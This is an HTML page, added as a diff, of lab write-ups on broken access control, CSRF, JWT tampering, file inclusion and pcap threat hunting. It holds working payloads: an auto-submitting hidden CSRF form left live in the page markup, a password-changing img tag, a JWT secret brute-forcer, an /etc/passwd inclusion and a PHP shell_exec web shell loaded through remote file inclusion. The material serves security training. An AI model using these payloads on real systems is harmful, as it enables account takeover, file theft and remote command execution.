@@ -1,0 +1,594 @@
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>InfoSec Institute Writeup</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/lightgallery.js/dist/css/lightgallery.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/lg-thumbnail.js/dist/lg-thumbnail.min.css" rel="stylesheet">
+        <!-- Add Pygments CSS for code highlighting -->
+        <style>pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.highlight .hll { background-color: #ffffcc }
+.highlight { background: #f8f8f8; }
+.highlight .c { color: #3D7B7B; font-style: italic } /* Comment */
+.highlight .err { border: 1px solid #FF0000 } /* Error */
+.highlight .k { color: #008000; font-weight: bold } /* Keyword */
+.highlight .o { color: #666666 } /* Operator */
+.highlight .ch { color: #3D7B7B; font-style: italic } /* Comment.Hashbang */
+.highlight .cm { color: #3D7B7B; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #9C6500 } /* Comment.Preproc */
+.highlight .cpf { color: #3D7B7B; font-style: italic } /* Comment.PreprocFile */
+.highlight .c1 { color: #3D7B7B; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #3D7B7B; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #A00000 } /* Generic.Deleted */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #E40000 } /* Generic.Error */
+.highlight .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+.highlight .gi { color: #008400 } /* Generic.Inserted */
+.highlight .go { color: #717171 } /* Generic.Output */
+.highlight .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+.highlight .gt { color: #0044DD } /* Generic.Traceback */
+.highlight .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+.highlight .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+.highlight .kn { color: #008000; font-weight: bold } /* Keyword.Namespace */
+.highlight .kp { color: #008000 } /* Keyword.Pseudo */
+.highlight .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #B00040 } /* Keyword.Type */
+.highlight .m { color: #666666 } /* Literal.Number */
+.highlight .s { color: #BA2121 } /* Literal.String */
+.highlight .na { color: #687822 } /* Name.Attribute */
+.highlight .nb { color: #008000 } /* Name.Builtin */
+.highlight .nc { color: #0000FF; font-weight: bold } /* Name.Class */
+.highlight .no { color: #880000 } /* Name.Constant */
+.highlight .nd { color: #AA22FF } /* Name.Decorator */
+.highlight .ni { color: #717171; font-weight: bold } /* Name.Entity */
+.highlight .ne { color: #CB3F38; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #0000FF } /* Name.Function */
+.highlight .nl { color: #767600 } /* Name.Label */
+.highlight .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
+.highlight .nt { color: #008000; font-weight: bold } /* Name.Tag */
+.highlight .nv { color: #19177C } /* Name.Variable */
+.highlight .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mb { color: #666666 } /* Literal.Number.Bin */
+.highlight .mf { color: #666666 } /* Literal.Number.Float */
+.highlight .mh { color: #666666 } /* Literal.Number.Hex */
+.highlight .mi { color: #666666 } /* Literal.Number.Integer */
+.highlight .mo { color: #666666 } /* Literal.Number.Oct */
+.highlight .sa { color: #BA2121 } /* Literal.String.Affix */
+.highlight .sb { color: #BA2121 } /* Literal.String.Backtick */
+.highlight .sc { color: #BA2121 } /* Literal.String.Char */
+.highlight .dl { color: #BA2121 } /* Literal.String.Delimiter */
+.highlight .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+.highlight .s2 { color: #BA2121 } /* Literal.String.Double */
+.highlight .se { color: #AA5D1F; font-weight: bold } /* Literal.String.Escape */
+.highlight .sh { color: #BA2121 } /* Literal.String.Heredoc */
+.highlight .si { color: #A45A77; font-weight: bold } /* Literal.String.Interpol */
+.highlight .sx { color: #008000 } /* Literal.String.Other */
+.highlight .sr { color: #A45A77 } /* Literal.String.Regex */
+.highlight .s1 { color: #BA2121 } /* Literal.String.Single */
+.highlight .ss { color: #19177C } /* Literal.String.Symbol */
+.highlight .bp { color: #008000 } /* Name.Builtin.Pseudo */
+.highlight .fm { color: #0000FF } /* Name.Function.Magic */
+.highlight .vc { color: #19177C } /* Name.Variable.Class */
+.highlight .vg { color: #19177C } /* Name.Variable.Global */
+.highlight .vi { color: #19177C } /* Name.Variable.Instance */
+.highlight .vm { color: #19177C } /* Name.Variable.Magic */
+.highlight .il { color: #666666 } /* Literal.Number.Integer.Long */</style>
+        <style>
+            /* Center the HTML file on the screen */
+            body {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                padding-top: 30px;
+            }
+            /* Make the display width of the HTML file smaller */
+            .container {
+                max-width: 42vw;
+                margin: 0 auto;
+                height: 100%
+            }
+            
+            img {
+                width: 80%;
+            }
+        </style>
+        <script src="https://cdn.jsdelivr.net/npm/lightgallery.js/dist/js/lightgallery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js/dist/lg-thumbnail.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-zoom.js/dist/lg-zoom.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js/dist/lg-fullscreen.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-share.js/dist/lg-share.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js/dist/lg-autoplay.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-rotate.js/dist/lg-rotate.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-flip.js/dist/lg-flip.min.js"></script>
+        <script>
+            window.onload = function() {
+                const images = document.getElementsByTagName('img');
+                const lightGalleryItems = [];
+                for (let i = 0; i < images.length; i++) {
+                    const img = images[i];
+                    if (img.naturalWidth > 1000) {
+                        if (window.innerWidth > 768) {
+                            img.style.width = '110%';
+                            img.style.transform = 'translateX(-4%)';
+                        } else {
+                            img.style.width = '100%';
+                            img.style.transform = 'none';
+                        }
+                    }
+                    lightGalleryItems.push({ src: img.src, thumb: img.src });
+                    img.setAttribute('data-lg-idx', i);
+                    img.addEventListener('click', function() {
+                        lightGallery(img, {
+                            dynamic: true,
+                            dynamicEl: lightGalleryItems,
+                            index: parseInt(img.getAttribute('data-lg-idx'))
+                        });
+                    });
+                }
+            };
+        </script>
+    </head>
+    <body>
+        <div class="container">
+            <div class="row">
+                <div class="col">
+                    <h1 style="text-align:center; text-transform:uppercase; font-family: 'Playfair Display', serif; font-weight:700;"">MITRE ATT&CK - Initial Access - Broken Access Control</h1>
+
+<p>Sunday, July 24, 2022</p>
+<p>2:43 PM</p>
+<p>Access Control</p>
+<p>Access Control is the set of policies and mechanisms that ensure users cannot act outside their intended permissions. Authorization indicates that access is provided only to users entitled to the usage. Authorization comes in after a user is successfully authenticated and a valid session is set up. Broken Access Control presents the failure of access control mechanisms, aiming to limit or control access to resources appropriately.</p>
+<p>Access controls are a critical defense mechanism within the application. They are responsible for deciding whether they should permit a given request to perform its attempted action or access its requested resources.</p>
+<p>Access controls can be classified into three categories:</p>
+<ul>
+<li>Vertical access controls allow different types of users to access various application functions, such as the role of an admin and other ordinary users.</li>
+<li>Horizontal access controls allow the same group of users to access the same type of functionality.</li>
+<li>Context-dependent access controls allow access to functionality and resources depending on the state of the application.
+Broken Access Control is included in the category with the most severe web application security risk by OWASP.</li>
+</ul>
+<p>As indicated by its name, Request Forgery is a fabricated request. Cross-Site Request Forgery, also known as CSRF, is a common web vulnerability used by attackers to trick victims into generating a request that performs specific actions on behalf of the logged-in victim. The request is similar to standard requests generated by the user's browser; thus, the webserver executes its actions. CSRF vulnerabilities can be critical, resulting in password change, account takeover, etc.</p>
+<p>Open the browser and visit demo.com on port 5000.</p>
+<p>demo.com:5000</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_1.png" /></p>
+<p>To begin, click on the CSRF link. The link presents a login page. In it, type the following default credentials (username: admin, password: admin) to continue.</p>
+<p>admin</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_2.png" /></p>
+<p>Run burpsuite to capture</p>
+<p>An html file named evil-csrf.html is stored in the machine. This html file is a clone of the demo.com:5000/update page. The challenge is to add a few lines of code to the file to perform the malicious CSRF POST request. This will be achieved by adding a hidden iFrame that sends a request to the original site on behalf of the logged-in user. This request will change the value of the favorite color to 'Hacked'.</p>
+<p>To do so, open the terminal, change the directory to /root/evilscripts, and open the file using gedit as an editor.</p>
+<p>cd /root/evilscripts</p>
+<p>gedit evilcsrf.html</p>
+<p>The attacker adds a hidden iFrame using the display:none attribute and sends the form's response there. As a result, the victim does not see nor realize what has happened. Add the following lines of code at the end of the file.</p>
+<iframe style="display:none" name="csrfframe"></iframe>
+
+<p>Since the attacker does not want the victim to see the form, the input element is given the type hidden, thus making it invisible on the web page that the victim sees.</p>
+<form method='POST' action='http://demo.com:5000/update' target="csrfframe" id="csrfform"> <input type='hidden' name='color' value='Hacked!'> <input type='submit' value='submit'> </form>
+
+<p>As the final step, the attacker includes some JavaScript inside a <script> tag to automatically submit the form when the page is loaded. JavaScript calls the getElementByID() method on the HTML document with the ID of the form ("csrf-form") that the attacker set in the second line as an argument.</p>
+<script>document.getElementById("csrfform").submit()</script>
+
+<p>Once the form is submitted, the browser passes the victim's cookies to the original website through the HTTP POST request, making it seem as if the victim purposely changed the color to 'Hacked'.</p>
+<p>Lastly, click on the Save button to save the changes made.</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_3.png" /></p>
+<p>Run</p>
+<p>python3 m http.server 1337</p>
+<p>Next, open a new tab and load the evil page previously created by typing the following command:</p>
+<p>localhost:1337/evilcsrf.html</p>
+<p>The command will now send a POST request to the application and change the color value to the new value 'Hacked!'.</p>
+<p>Click on the Next button to complete the step.</p>
+<p>A POST request was initiated when the evil page was loaded, resulting in changing the submitted value of the favorite color to the new value of ‘Hacked!’.</p>
+<p>Click on the "Forward" button to send the request to the server.</p>
+<p>Go back to the vulnerable application and click on the 'refresh the page' link. The previously submitted favorite color would be replaced with the content of the malicious application.</p>
+<p>CORS allows cross-domain HTTP data exchange, indicating that a page running at origin A can send/receive data from a server at origin B. CORS is thoroughly used in web applications where web fonts, CSS, documents, and more, are loaded from different origins,  which may not be of the origin where the resources are stored.</p>
+<p>CORS operates by adding a new HTTP header that allows the webserver to speak up to a list of whitelisted domains allowed to connect and interact with the server. This process is also browser enforced; the browser reads the header and processes accordingly.</p>
+<p>The following CORS headers are the most used:</p>
+<p>-Access-Control-Allow-Origin: This header is a response header, indicating that as soon as a request is made to the server for exchanging data, the server responds with a header informing the browser whether the request's origin is listed inside the value of the response. If the header is not present or the response header does not contain the request origin inside the header, the request is dropped, and a security error is raised; otherwise, the request is processed.</p>
+<p>-Access-Control-Allow-Methods: This is another response header; the server responds with this header and instructs the browser to check for allowed HTTP methods mentioned inside of it. If the server only allows GET and a POST request is initiated, it will be dropped if not mentioned in this list.</p>
+<p>-Origin: This request header tells the server from which domain origin the request was attempted. The origin header is always sent alongside cross-domain requests.</p>
+<p>JWT</p>
+<p>JSON Web Token (JWT) is an open standard utilized to generate and use bearer tokens for authentication between two parties. The JWT token is an encoded form of data issued by the sender application and is used to authenticate the client's access. The JWT token structure is similar to that of a web request and consists of three parts separated by dots (.)</p>
+<ul>
+<li>Header</li>
+<li>Payload</li>
+<li>Signature
+Therefore, a JWT typically looks like the following: xxxxx.yyyyy.zzzzz</li>
+</ul>
+<p>The header is Base64Url encoded and contains the type of token and the hashing algorithms used, typically HMAC SHA256 or RSA. The payload contains the claims, which are statements about the entity, typically a user, and any additional data.</p>
+<p>The signature is the final part of the JWT structure. It takes the header and the payload, adds a secret to the hashing algorithm, and spits out a hash corresponding to the unaltered data in the rest of the JWT. Using the signature, the client app and the server can verify that the token they are receiving is the original, unaltered token.</p>
+<p>One example of a web application using JWT authentication can be found on jwt-demo.com:5000.</p>
+<p>jwt.com:5000</p>
+<p>The login process is a simple one. Click on the Authenticate button.</p>
+<p>Now, the client application can obtain an access token to access protected resources in subsequent HTTP requests. Once the client application receives the access token (JWT token) from the server, the token can be persisted into the local storage of client applications.</p>
+<p>To view the token right-click and go to Inspect Element. A window will appear at the bottom of the page. Select the Storage tab, then expand Local Storage. Whenever HTTP requests are sent to access the protected resources of the API server, the tokens stored in the Local Storage are checked.</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_4.png" /></p>
+<p>The server may be using a weak secret key for the hashing algorithm. Therefore, a potential hacker can easily brute force the secret key. Open a new terminal, change the directory to /root/evilscripts and create a new file named weak-secret.py.</p>
+<p>cd /root/evilscripts</p>
+<p>touch weaksecret.py</p>
+<p>Open the newly created file using gedit.</p>
+<p>gedit weaksecret.py</p>
+<p>The first thing the student must do is import the jwt object, which is part of the PyJWT package.</p>
+<p>import jwt</p>
+<p>Get the value of the token through the user's input.</p>
+<p>encoded = input("Enter encoded payload: ")</p>
+<p>Secondly, open the rockyou.txt file and read through each of its lines.</p>
+<p>with open('rockyou.txt') as secrets:</p>
+<p>for secret in secrets:</p>
+<p>Attempt to decode the given token with the current word file. If valid, print a success message; otherwise, try with the next word.</p>
+<p>try:</p>
+<p>payload = jwt.decode(encoded,secret.rstrip(), algorithms=['HS256'])</p>
+<p>print('Success! Token decoded with ....[' + secret.rstrip() + ']')</p>
+<p>break</p>
+<p>Notify the user if the token is in an invalid format or has expired.</p>
+<p>except jwt.InvalidTokenError:</p>
+<p>print('Invalid Token .... [' + secret.rstrip() + ']')</p>
+<p>except jwt.ExpiredSignatureError:</p>
+<p>print('Token Expired ....[' + secret.rstrip() + ']')</p>
+<p>Lastly, click on the Save button to save the changes made.</p>
+<p>Using the secret key found, an attacker can now decode the token and examine its content. To do so, create a new file named jwt_decoder.py.</p>
+<p>touch jwt_decoder.py</p>
+<p>Open the newly created file using gedit.</p>
+<p>gedit jwt_decoder.py</p>
+<p>Begin by importing the required jwt and json libraries.</p>
+<p>import jwt</p>
+<p>import json</p>
+<p>Create a method named menu, which will be used to contain all the necessary code.</p>
+<p>def menu():</p>
+<p>print('1. Decode JWT')</p>
+<p>print('2. Encode JWT')</p>
+<p>Save the algorithm and the secret token in separate variable</p>
+<p>algorithm = "HS256"</p>
+<p>secret = "banana!"</p>
+<p>Secondly, get user input on whether to encode or decode the token.</p>
+<p>choice = int(input('\nEnter your choice: '))</p>
+<p>Selecting the first option will prompt the user to enter the token.</p>
+<p>if(choice == 1):</p>
+<p>jwt_token = input('\nEnter the JWT Token: ')</p>
+<p>Decoding the token would take one simple line of code: the decode method along with the token, secret, and the algorithm used to sign the token.</p>
+<p>decoded_token = jwt.decode(jwt_token, secret, algorithm)</p>
+<p>Use the json.dumps() method to convert the returned Python object into a JSON string.</p>
+<p>decoded_token = json.dumps(decoded_token)</p>
+<p>Lastly, print the value of the decoded token.</p>
+<p>print(decoded_token)</p>
+<p>Copied to clipboard.</p>
+<p>The second part of the code will allow the user to modify tokens using the secret key found in the previous steps.</p>
+<p>elif(choice == 2):</p>
+<p>payload = input('Payload {"key": "value"}: ')</p>
+<p>Use the json.loads() method to convert a string to a Python dictionary.</p>
+<p>payload = json.loads(payload)</p>
+<p>Call the encode method from the jwt object and pass the generated Python dictionary, secret key, and hashing algorithm to it.</p>
+<p>token = jwt.encode(payload, secret, algorithm)</p>
+<p>Lastly, print the newly generated token.</p>
+<p>if(token != ''):</p>
+<p>print('\nJWT Token: {}'.format(token))</p>
+<p>Navigate to the end of the target's python file and add the if <strong>name</strong> == '<strong>main</strong>' expression, which calls the menu function.</p>
+<p>if <strong>name</strong> == '<strong>main</strong>':</p>
+<p>menu()</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_5.png" /></p>
+<p>Firstly, copy the stored token in local storage from the web application.</p>
+<p>Next, run the created python code with Python.</p>
+<p>python3 jwt_decoder.py</p>
+<p>Choose the first option to decode the token and then paste the copied value.</p>
+<p>The python code will successfully decode the token and display its values in the terminal. Copy the output and run the python a second time, now choosing to encode the JWT. Change the identity field value to 2 and generate a new JWT token.</p>
+<p>Now, use the newly generated JWT token to replace the one stored in the browser's local storage.</p>
+<p>Lastly, click on the Show userId button to check if the server accepted the tampered token.</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_6.png" /></p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_7.png" /></p>
+<p>Access control enforces the policy that prevents users from acting outside of the intended permissions. Failures typically lead to unauthorized information disclosure, modification destruction of all data, or the performance of a business function outside the user's limits.</p>
+<p>Access control vulnerabilities can generally be prevented by taking a defense-in-depth approach and applying the following principles:</p>
+<ul>
+<li>Do Not Rely on Obfuscation: Obfuscation is insufficient to keep sensitive information safe.</li>
+<li>Unless a resource is publicly accessible, deny access by default.</li>
+<li>Wherever possible, use a single application-wide mechanism for enforcing access controls.</li>
+<li>At the code level, make it mandatory for developers to declare the access allowed for each resource and deny access by default.</li>
+<li>Ensure that all users, programs, or processes are only given as little necessary access as possible.</li>
+<li>Log all Access Control failures.</li>
+<li>Thoroughly audit and test access controls to ensure they are working as designed.
+Most developers use the classic method of adding a secret token named anti-CSRF to prevent CSRF vulnerabilities. This token is added to all sensitive requests and is verified by the server for authenticity. The anti-CSRF token is a random string only known to the user's browser and the web application.</li>
+</ul>
+<p>When an operation is submitted, the web application checks for the presence of the correct token.</p>
+<p>The parameter value of the token is examined and validated by the server to the logged-in user's session. If a mismatch occurs, the request is denied.</p>
+<p>Cyber Threat Hunting - Finding threats in .pcap files</p>
+<p>Wednesday, July 27, 2022</p>
+<p>10:44 PM</p>
+<p>We want to see all the connections that were made, when they were made, the parties involved in connections, the ports used in the connection, and the duration of the connection. To complete this we use the command</p>
+<p>zeekcut &lt; conn.log d ts id.orig_h id.resp_h id.orig_p id.resp_p duration</p>
+<p>Notice the IPv6 addresses toward the bottom and the duration. This could be an indication that your network may be compromised.</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_8.png" /></p>
+<p>The ports involved in the IPv6 exchange aren’t normally used, to see if they are used in any other connection use the previous command and add a grep for port 546. The command should look like:</p>
+<p>zeekcut &lt; conn.log d ts id.orig_h id.resp_h id.orig_p id.resp_p duration | grep 546</p>
+<p>You can use grep to find character within the log file.</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_9.png" /></p>
+<p>We will now view the contents of the http log that we made earlier. This log contains all the http communication captured in original .pcap file. To begin we will look at the same attributes that we used on conn.log with the addition of the method in the communication (POST or GET) and the URL.</p>
+<p>zeekcut &lt; http.log d ts id.orig_h id.orig_p id.resp_h id.resp_p duration method uri</p>
+<p>The most concerning interaction that we can see is the supercalc.exe file we downloaded. Not only does the naming look suspicious but we never communicate with the IP 206.188.192.204 again within the HTTP log.</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_10.png" /></p>
+<p>We have now found a suspicious executable file and should examine it further. To do this let us use wireshark to open the covertchannel.pcap file and view its contents. The command is</p>
+<p>wireshark covertchannel.pcap</p>
+<p>This should launch wireshark and already have the file loaded.</p>
+<p>We will view the interaction between the two IP addresses in the supercalc.exe in wireshark. In the display filter use the filter ip.addr==192.168.153.129 &amp;&amp; ip.addr==206.186.192.204 and notice the traffic interaction between the two parties. Remember that 206.186.192.204 is the IP we noticed in the logs earlier.</p>
+<p>ip.addr==192.168.153.129 &amp;&amp; ip.addr==206.188.192.204</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_11.png" /></p>
+<p>To export supercalc.exe go to File &gt; Export Objects &gt; HTTP and save supercalc.exe on your desktop.</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_12.png" /></p>
+<p>Common Attack Types - File Inclusion &amp; Cross-Site Request Forgery (CSRF)</p>
+<p>Thursday, July 28, 2022</p>
+<p>10:54 PM</p>
+<p>There are three modifications needed to use ZAP as a proxy. First, import the SSL certificate generated from ZAP.</p>
+<p>Click on ‘Tools’ and select ‘Options’.</p>
+<p>Click on ‘Dynamic SSL Certificates’ on the left pane of the window that appears.</p>
+<p>Click on ‘Save’ to download the certificate. In the pop-up that appears, save the certificate in the default folder (/root).</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_13.png" /></p>
+<p>Install cert to browser</p>
+<p>To begin, open a web browser and navigate to ''. It will launch the zap proxy and may take a moment to load:</p>
+<p>Click "Continue to your target"</p>
+<p>To log in, use the username and password of 'admin'</p>
+<p>admin</p>
+<p>File inclusions can be of two types, local and remote.</p>
+<p>Local File Inclusion (LFI) is a vulnerability that allows attackers to include files that exist locally into the server. To view an example of such a vulnerability, go to  and select A7 Missing Functional Level Access Control’. Click on Remote &amp; Local File Inclusion (RFI/LFI).</p>
+<p>To see how the request is being sent, click on the drop-down list and select one of the languages. Click on the Go button and check the URL.</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_14.png" /></p>
+<p>The events that occur once the Go button is clicked are as follows:</p>
+<ol>
+<li>The request sent to the server is a GET request. The GET request parameters can be seen in the URL.</li>
+<li>One of the parameters is called language. Its value depends on which element is picked from the drop-down menu. English is used in this example.</li>
+<li>The server receives the request. A part of the PHP code that handles this request is shown below</li>
+<li>The server extracts the language GET variable and obtains its value (in this case, the value is lang_en.php). This is shown in the second line of the PHP code above.</li>
+<li>The server then passes that value to the include() function. This is shown in the third line of the code above. Include() is a PHP function that takes as input a filename and then loads that file's content into the response that will be sent back to the user. In this example, include(lang_en.php) copies the content inside lang_en.php. After this function is executed, the script above will look like the following:</li>
+<li>The server then responds to the website by sending the message inside the lang_en.php file, which in this case is ‘Hello!’
+The local file injection, if it exists, occurs in step 5 when the include function is executed. The attack is initiated in step 2, where instead of a language file, another file name is sent. As an example, to view the content of /etc/passwd enter the following URL in the URL bar and press the Return key.</li>
+</ol>
+<p>/etc/passwd</p>
+<p>All six steps described above will be repeated, but in this instance, the include() function will copy the content of the /etc/passwd file and display it on the website.</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_15.png" /></p>
+<p>Because both LFI and directory traversal were used to display the content of /etc/passwd, it might seem like they are similar vulnerabilities. However, they are caused by different functions. Directory traversal vulnerabilities are caused by PHP functions such as fopen() that allow attackers only to view files. LFI vulnerabilities are caused by PHP functions such as include() and require() that load and execute in the context of the current application.</p>
+<p>Remote File Inclusion (RFI) attacks work in a similar manner to LFI attacks. The difference is that instead of including local server files, attackers include their custom made scripts. The damage caused by RFI attacks can range from sensitive data disclosure to full system compromisation. The same webpage can be used to illustrate RFI. Open the terminal and list the files in the /root directory by using the ls command.</p>
+<p>Lets begin by opening a new terminal and creating a file called remote_shell.txt.</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_16.png" /></p>
+<p>Fill the file with the php script you see below. To save the file press CTRL followed by X, then type Y and press ENTER to save the file</p>
+<?php $output = shell_exec($_GET["cmd"]); echo "<pre> $output </pre>"; ?>
+
+<p>The script accepts a variable as input. This variable is a GET request parameter called cmd. Using the RFI vulnerability, the script can be included in the web server hosting the  website. When it is executed on the server, it runs commands and displays the output on the website. To exploit the vulnerability, follow these steps:</p>
+<ol>
+<li>
+<p>Open a port in the terminal using python's http.server module. This module makes all the files in the current directory accessible via the HTTP protocol.
+python3 m http.server &amp;&gt; http.log</p>
+</li>
+<li>
+<p>Go back to the browser and modify the URL.
+a. The first thing to add is the protocol. Since python's http.server module was used, the protocol should be HTTP</p>
+</li>
+</ol>
+<p>b. Write the IP address of the container</p>
+<p>c. The default port of the server is 8000. The IP and port duo is called a socket. A socket identifies a process. In this case, [KALI P]:8000 identifies the python server running on the container.</p>
+<p>d. The script remote_shell.php uses parameters passed through GET requests and runs them as shell commands. The variable cmd is such a parameter.</p>
+<p>IP]:8000/remote_shell.php&amp;action=go&amp;cmd=id</p>
+<ol start="3">
+<li>Press the Return key to send the request. This request uploads the remote_shell.php script to the web server hosting the  website.</li>
+<li>
+<p>The website will display the following message:
+<img alt="" src="../media/InfoSec%20Institute%20Writeup_17.png" /></p>
+</li>
+<li>
+<p>Go to the terminal and stop the python server using Control + C
+HTTP requests are stateless since the protocol was not designed to remember user information. HTTP Cookies are small pieces of data that offer a reliable mechanism for websites to remember stateful information or record the user's browsing activity. In the HTTP request made when changing the password, the Cookie is used to identify the user. This Cookie legitimizes the request and allows the server to assign the process of password changing to the specific user.</p>
+</li>
+</ol>
+<p>In this example, changing the password consists of a request that is validated with a Cookie. All an attacker has to do to exploit this process is to trick the users into running the request while they have an active session. Consider the following payload:</p>
+<p><img src='http://bwapp/csrf_1.php?password_new=changed&password_conf=changed&action=change' height=0 width=0></p>
+<p>The HTML tag is used to embed an image in an HTML page. Because the height and the width of the image are set to zero, it will not be shown on the website but will be part of its code. The tag has an attribute called src that specifies the location of the image. When the website is rendered, that link is visited. In this case, instead of locating an image, the link will make a request to the server to change the password. Copy that link and paste it to 'A3 - Cross-Site Scripting (XSS)' and selected 'Cross-Site Scripting Stored (Blog)'</p>
+<p><img alt="" src="../media/InfoSec%20Institute%20Writeup_18.png" /></p>
+<p>A new entry will be added, but it will appear to be empty. Log out of the admin account and sign in as Bob with username 'bob' and password 'test'. Go to 'A3 - Cross-Site Scripting (XSS)' and select 'Cross-Site Scripting Stored (Blog)'. The events that occur when user Bob visits the sites are:</p>
+<ol>
+<li>First, only entries added by Bob are shown. To display the entries of all users, click on ‘Show all:’ and then on Submit.</li>
+<li>The tag gets rendered, and the link specified in src is loaded.</li>
+<li>Because that link is, in fact, a request for a password change, the server will receive an HTTP request from user Bob asking to change the password from 'test' to 'changed'.</li>
+<li>Because Bob is logged in, the browser makes the request with his cookie, authenticating him to the server.</li>
+<li>The server receives the request and the cookie. It then proceeds to change his password.</li>
+<li>Bob is not aware of the password change.
+In this similar manner, an adversary could trick several users into changing their credentials and then access their accounts. To see the request, right-click on the browser and select 'Inspect Element (Q)'. Then click on Network. Filter the data using . The website will list the requests that initiated the password change. If nothing is shown, refresh the page to allow the browser to capture the requests.</li>
+</ol>
+<p>Sign out as user Bob and try to sign in again with the old credentials to test if the password was indeed changed.</p>
+                </div>
+            </div>
+        </div>    
+    </body>
+    </html>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<style>
+
+.copy-button {
+  position: absolute;
+  right: 5px ;
+  top: 5px;
+  border: transparent;
+  background-color: transparent;
+  padding: 2px 6px;
+  cursor: pointer;
+  font-size: 14px;
+  color: #333;
+  border-radius: 8px;
+
+}
+
+.copy-button:hover {
+  background-color: #30363d; # Change this to a different color to create a hover effect
+}
+.material-icons{
+  line-height:1.3;
+  color: #7d8590;
+}
+
+pre {
+  position: relative;
+  # padding: 20px;
+  border: 1px solid #e7ee7;
+  overflow-x: auto; # Remove this line to disable horizontal scrolling
+  font-size: 14px;
+  line-height: 1.5;
+  border-radius: 6px;
+  margin-bottom: 20px;
+
+  # Add these lines to set a fixed width for the code block and wrap long lines
+  #width: 80%;
+  white-space: pre-wrap; 
+}
+
+pre code {
+  display: block;
+  border-radius: 8px;
+  background-color: #2d2d2d; # Change this to a different color to match the copy button background
+
+}
+
+
+
+
+@media only screen and (min-width: 280px) {
+  img {
+    width: 85%; /* Make image smaller on tablets and mobiles */
+  }
+}
+
+@media only screen and (max-width: 768px) {
+  img {
+    width: 85%; /* Make image smaller on tablets and desktops */
+  }
+}
+
+# @media (min-width: 576px) {
+#   img {
+#     max-width: 540px;
+#   }
+# }
+
+# @media (min-width: 768px) {
+#   img {
+#     max-width: 720px;
+#   }
+# }
+
+
+
+@media (min-width: 280px) {
+  .container {
+    max-width: 90%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+@media (min-width: 750px) {
+  .container {
+    max-width: 80%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+
+
+@media (min-width: 912px) {
+  .container {
+    max-width: 70%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+# @media (min-width: 1200px) {
+#   .container {
+#     max-width: 70%;
+#     margin: 0 auto;
+#     height: 100%;
+#   }
+# }
+
+# @media (min-width: 576px) {
+#   .container {
+#     max-width: 540px;
+#   }
+# }
+
+# @media (min-width: 768px) {
+#   .container {
+#     max-width: 620px;
+#     margin: 0;
+#   }
+# }
+
+# @media (min-width: 992px) {
+#   .container {
+#     max-width: 760px;
+#   }
+# }
+
+@media (min-width: 1200px) {
+  .container {
+    max-width: 735px;
+    margin: 0;
+    height: 100%;
+  }
+}
+
+# p { 
+#   text-indent: 10px;
+# }
+
+h2 {
+  font-size: 1.5rem;
+}
+
+h3 {
+  font-size: 1.3rem;
+}
+
+# .container {
+#   max-width: 100%; /* Set the container width to 100% */
+#   padding-left: 15px; /* Add some padding to the left */
+#   padding-right: 15px; /* Add some padding to the right */
+# }
+
+
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/highlight.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark-reasonable.min.css">
+
